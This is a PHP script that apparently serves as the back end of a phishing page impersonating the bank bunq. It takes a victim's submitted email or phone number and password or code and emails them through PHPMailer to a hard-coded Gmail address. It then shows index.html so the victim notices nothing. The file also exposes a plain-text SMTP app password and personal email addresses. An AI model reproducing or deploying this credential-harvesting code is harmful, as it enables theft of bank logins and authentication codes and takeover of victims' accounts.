<?php 
session_start(); 
?>

<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
$email = htmlspecialchars($_POST["email"]);
$code = htmlspecialchars($_POST["password"]);

$message = "Email ou Tel: $email\n <br>
    Code: $code\n";
//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = 0;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'clarisaclarise@gmail.com';                     //SMTP username
    $mail->Password   = 'yafstxownkrxypbb';                               //SMTP password
    $mail->SMTPSecure = 'ssl';            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('clarisaclarise@gmail.com', 'Administrateur');
    $mail->addAddress('clarisaclarise@gmail.com', 'bunq');     //Add a recipient
    //$mail->addAddress('sabrinaholt771@gmail.com');               //Name is optional
    //$mail->addReplyTo($mail, 'Information');
    //$mail->addCC('cc@example.com');
    //$mail->addBCC('bcc@example.com');

    //Attachments
    //$mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'bunq authenticate code';
    
    $mail->Body    = $message ;
    //$mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    $ressource = fopen('index.html', 'rb');
    echo fread($ressource, filesize('index.html'));
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}

 ?>